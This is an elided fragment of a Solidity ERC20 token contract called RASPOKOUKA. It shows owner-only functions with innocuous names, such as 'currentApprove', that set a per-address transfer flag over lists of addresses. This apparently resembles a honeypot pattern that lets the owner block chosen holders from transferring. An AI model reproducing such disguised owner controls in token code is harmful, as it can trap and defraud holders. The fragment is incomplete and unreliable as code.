...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function currentTransfer(address [] calldata _addresses_) external onlyOwner {
    ...
    function currentApprove(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _transfersSnapshot[_addresses_[i]] = false;
        }
    }

    function isApprovedCheck(address _address_) public view returns (bool) {
...
contract RASPOKOUKA is ERC20 {
    constructor() ERC20("RASPOKOUKA", "RASPOKOUKA") {
